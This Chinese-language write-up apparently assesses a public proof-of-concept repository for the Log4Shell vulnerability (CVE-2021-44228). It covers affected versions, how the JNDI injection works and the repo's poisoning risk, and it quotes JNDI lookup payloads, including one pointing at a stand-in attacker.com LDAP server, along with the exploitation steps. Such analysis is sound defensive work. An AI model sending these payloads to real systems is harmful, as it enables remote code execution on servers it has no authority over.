## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)